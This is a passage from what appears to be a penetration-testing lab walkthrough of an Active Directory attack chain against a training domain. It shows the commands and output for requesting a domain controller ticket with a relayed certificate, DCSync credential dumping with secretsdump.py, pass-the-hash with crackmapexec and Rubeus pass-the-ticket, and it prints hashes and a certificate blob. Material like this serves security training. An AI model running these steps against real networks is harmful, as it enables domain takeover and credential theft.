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 dc01.ccache
<a id=__codelineno-16-2 name=__codelineno-16-2 href=#__codelineno-16-2></a>
<a id=__codelineno-16-3 name=__codelineno-16-3 href=#__codelineno-16-3></a>2022-04-05 15:56:33,239 minikerberos INFO     Loading certificate and key from file
<a id=__codelineno-16-4 name=__codelineno-16-4 href=#__codelineno-16-4></a>INFO:minikerberos:Loading certificate and key from file
<a id=__codelineno-16-5 name=__codelineno-16-5 href=#__codelineno-16-5></a>2022-04-05 15:56:33,362 minikerberos INFO     Requesting TGT
<a id=__codelineno-16-6 name=__codelineno-16-6 href=#__codelineno-16-6></a>INFO:minikerberos:Requesting TGT
<a id=__codelineno-16-7 name=__codelineno-16-7 href=#__codelineno-16-7></a>2022-04-05 15:56:33,395 minikerberos INFO     AS-REP encryption key (you might need this later):
<a id=__codelineno-16-8 name=__codelineno-16-8 href=#__codelineno-16-8></a>INFO:minikerberos:AS-REP encryption key (you might need this later):
<a id=__codelineno-16-9 name=__codelineno-16-9 href=#__codelineno-16-9></a>2022-04-05 15:56:33,396 minikerberos INFO     70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275
<a id=__codelineno-16-10 name=__codelineno-16-10 href=#__codelineno-16-10></a>INFO:minikerberos:70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275
<a id=__codelineno-16-11 name=__codelineno-16-11 href=#__codelineno-16-11></a>2022-04-05 15:56:33,401 minikerberos INFO     Saved TGT to file
<a id=__codelineno-16-12 name=__codelineno-16-12 href=#__codelineno-16-12></a>INFO:minikerberos:Saved TGT to file
</code></pre></div> <p>The TGT requested above was saved down to the <code>dc01.ccache</code> file, which we use to set the KRB5CCNAME environment variable, so our attack host uses this file for Kerberos authentication attempts.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-17-1 name=__codelineno-17-1 href=#__codelineno-17-1></a>secops@kali[/kali]$ export KRB5CCNAME=dc01.ccache
</code></pre></div> <p>We can then use this TGT with <code>secretsdump.py</code> to perform a DCSYnc and retrieve one or all of the NTLM password hashes for the domain. <div class=highlight><pre><span></span><code><a id=__codelineno-18-1 name=__codelineno-18-1 href=#__codelineno-18-1></a>secops@kali[/kali]$ secretsdump.py -just-dc-user LEGALCORP/administrator -k -no-pass &quot;ACADEMY-EA-DC01$&quot;@ACADEMY-EA-DC01.legalcorp.local
<a id=__codelineno-18-2 name=__codelineno-18-2 href=#__codelineno-18-2></a>
<a id=__codelineno-18-3 name=__codelineno-18-3 href=#__codelineno-18-3></a>Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
<a id=__codelineno-18-4 name=__codelineno-18-4 href=#__codelineno-18-4></a>
<a id=__codelineno-18-5 name=__codelineno-18-5 href=#__codelineno-18-5></a>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
<a id=__codelineno-18-6 name=__codelineno-18-6 href=#__codelineno-18-6></a>[*] Using the DRSUAPI method to get NTDS.DIT secrets
<a id=__codelineno-18-7 name=__codelineno-18-7 href=#__codelineno-18-7></a>legalcorp.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
<a id=__codelineno-18-8 name=__codelineno-18-8 href=#__codelineno-18-8></a>[*] Kerberos keys grabbed
<a id=__codelineno-18-9 name=__codelineno-18-9 href=#__codelineno-18-9></a>legalcorp.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
<a id=__codelineno-18-10 name=__codelineno-18-10 href=#__codelineno-18-10></a>legalcorp.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
<a id=__codelineno-18-11 name=__codelineno-18-11 href=#__codelineno-18-11></a>legalcorp.local\administrator:des-cbc-md5:70add6e02f70321f
<a id=__codelineno-18-12 name=__codelineno-18-12 href=#__codelineno-18-12></a>[*] Cleaning up... 
</code></pre></div></p> <p>We could also use a more straightforward command: <code>secretsdump.py -just-dc-user LEGALCORP/administrator -k -no-pass ACADEMY-EA-DC01.legalcorp.local</code> because the tool will retrieve the username from the ccache file. We can see this by typing <code>klist</code>.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-19-1 name=__codelineno-19-1 href=#__codelineno-19-1></a>secops@kali[/kali]$ klist
<a id=__codelineno-19-2 name=__codelineno-19-2 href=#__codelineno-19-2></a>
<a id=__codelineno-19-3 name=__codelineno-19-3 href=#__codelineno-19-3></a>Ticket cache: FILE:dc01.ccache
<a id=__codelineno-19-4 name=__codelineno-19-4 href=#__codelineno-19-4></a>Default principal: ACADEMY-EA-DC01$@legalcorp.local
<a id=__codelineno-19-5 name=__codelineno-19-5 href=#__codelineno-19-5></a>
<a id=__codelineno-19-6 name=__codelineno-19-6 href=#__codelineno-19-6></a>Valid starting       Expires              Service principal
<a id=__codelineno-19-7 name=__codelineno-19-7 href=#__codelineno-19-7></a>04/05/2022 15:56:34  04/06/2022 01:56:34  krbtgt/legalcorp.local@legalcorp.local
</code></pre></div> <h3>Confirming Admin Access to the Domain Controller</h3> <div class=highlight><pre><span></span><code><a id=__codelineno-20-1 name=__codelineno-20-1 href=#__codelineno-20-1></a>secops@kali[/kali]$ crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
<a id=__codelineno-20-2 name=__codelineno-20-2 href=#__codelineno-20-2></a>
<a id=__codelineno-20-3 name=__codelineno-20-3 href=#__codelineno-20-3></a>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:legalcorp.local) (signing:True) (SMBv1:False)
<a id=__codelineno-20-4 name=__codelineno-20-4 href=#__codelineno-20-4></a>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] legalcorp.local\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
</code></pre></div> <p>From here, we have complete control over the domain and could look to establish persistence, search for sensitive data, look for other misconfigurations and vulnerabilities for our report, or begin enumerating trust relationships.</p> <hr> <h3>Submitting a TGS Request for Ourselves Using getnthash.py</h3> <p>We can also take an alternate route once we have the TGT for our target. Using the tool <code>getnthash.py</code> from PKINITtools we could request the NT hash for our target host/user by using Kerberos U2U to submit a TGS request with the <a href=https://stealthbits.com/blog/what-is-the-kerberos-pac/ target=_blank rel="noopener nofollow">Privileged Attribute Certificate (PAC)</a> which contains the NT hash for the target. This can be decrypted with the AS-REP encryption key we obtained when requesting the TGT earlier.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-21-1 name=__codelineno-21-1 href=#__codelineno-21-1></a>secops@kali[/kali]$ python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 legalcorp.local/ACADEMY-EA-DC01$
<a id=__codelineno-21-2 name=__codelineno-21-2 href=#__codelineno-21-2></a>
<a id=__codelineno-21-3 name=__codelineno-21-3 href=#__codelineno-21-3></a>Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
<a id=__codelineno-21-4 name=__codelineno-21-4 href=#__codelineno-21-4></a>
<a id=__codelineno-21-5 name=__codelineno-21-5 href=#__codelineno-21-5></a>[*] Using TGT from cache
<a id=__codelineno-21-6 name=__codelineno-21-6 href=#__codelineno-21-6></a>[*] Requesting ticket to self with PAC
<a id=__codelineno-21-7 name=__codelineno-21-7 href=#__codelineno-21-7></a>Recovered NT Hash
<a id=__codelineno-21-8 name=__codelineno-21-8 href=#__codelineno-21-8></a>313b6f423cd1ee07e91315b4919fb4ba
</code></pre></div> <p>We can then use this hash to perform a DCSync with secretsdump.py using the <code>-hashes</code> flag.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-22-1 name=__codelineno-22-1 href=#__codelineno-22-1></a>secops@kali[/kali]$ secretsdump.py -just-dc-user LEGALCORP/administrator &quot;ACADEMY-EA-DC01$&quot;@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
<a id=__codelineno-22-2 name=__codelineno-22-2 href=#__codelineno-22-2></a>
<a id=__codelineno-22-3 name=__codelineno-22-3 href=#__codelineno-22-3></a>Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
<a id=__codelineno-22-4 name=__codelineno-22-4 href=#__codelineno-22-4></a>
<a id=__codelineno-22-5 name=__codelineno-22-5 href=#__codelineno-22-5></a>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
<a id=__codelineno-22-6 name=__codelineno-22-6 href=#__codelineno-22-6></a>[*] Using the DRSUAPI method to get NTDS.DIT secrets
<a id=__codelineno-22-7 name=__codelineno-22-7 href=#__codelineno-22-7></a>legalcorp.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
<a id=__codelineno-22-8 name=__codelineno-22-8 href=#__codelineno-22-8></a>[*] Kerberos keys grabbed
<a id=__codelineno-22-9 name=__codelineno-22-9 href=#__codelineno-22-9></a>legalcorp.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
<a id=__codelineno-22-10 name=__codelineno-22-10 href=#__codelineno-22-10></a>legalcorp.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
<a id=__codelineno-22-11 name=__codelineno-22-11 href=#__codelineno-22-11></a>legalcorp.local\administrator:des-cbc-md5:70add6e02f70321f
<a id=__codelineno-22-12 name=__codelineno-22-12 href=#__codelineno-22-12></a>[*] Cleaning up...
</code></pre></div> <p>Alternatively, once we obtain the base64 certificate via ntlmrelayx.py, we could use the certificate with the Rubeus tool on a Windows attack host to request a TGT ticket and perform a pass-the-ticket (PTT) attack all at once.</p> <p>Requesting TGT and Performing PTT with DC01$ Machine Account <div class=highlight><pre><span></span><code><a id=__codelineno-23-1 name=__codelineno-23-1 href=#__codelineno-23-1></a>PS C:\Tools&gt; .\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate: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 /ptt
<a id=__codelineno-23-2 name=__codelineno-23-2 href=#__codelineno-23-2></a>
<a id=__codelineno-23-3 name=__codelineno-23-3 href=#__codelineno-23-3></a>   ______        _
<a id=__codelineno-23-4 name=__codelineno-23-4 href=#__codelineno-23-4></a>  (_____ \      | |
<a id=__codelineno-23-5 name=__codelineno-23-5 href=#__codelineno-23-5></a>   _____) )_   _| |__  _____ _   _  ___
<a id=__codelineno-23-6 name=__codelineno-23-6 href=#__codelineno-23-6></a>  |  __  /| | | |  _ \| ___ | | | |/___)
<a id=__codelineno-23-7 name=__codelineno-23-7 href=#__codelineno-23-7></a>  | |  \ \| |_| | |_) ) ____| |_| |___ |
<a id=__codelineno-23-8 name=__codelineno-23-8 href=#__codelineno-23-8></a>  |_|   |_|____/|____/|_____)____/(___/
<a id=__codelineno-23-9 name=__codelineno-23-9 href=#__codelineno-23-9></a>
<a id=__codelineno-23-10 name=__codelineno-23-10 href=#__codelineno-23-10></a>  v2.0.2
<a id=__codelineno-23-11 name=__codelineno-23-11 href=#__codelineno-23-11></a>
<a id=__codelineno-23-12 name=__codelineno-23-12 href=#__codelineno-23-12></a>[*] Action: Ask TGT
<a id=__codelineno-23-13 name=__codelineno-23-13 href=#__codelineno-23-13></a>
<a id=__codelineno-23-14 name=__codelineno-23-14 href=#__codelineno-23-14></a>[*] Using PKINIT with etype rc4_hmac and subject: CN=ACADEMY-EA-DC01.legalcorp.local
<a id=__codelineno-23-15 name=__codelineno-23-15 href=#__codelineno-23-15></a>[*] Building AS-REQ (w/ PKINIT preauth) for: &#39;legalcorp.local\ACADEMY-EA-DC01$&#39;
<a id=__codelineno-23-16 name=__codelineno-23-16 href=#__codelineno-23-16></a>[*] Using domain controller: 172.16.5.5:88
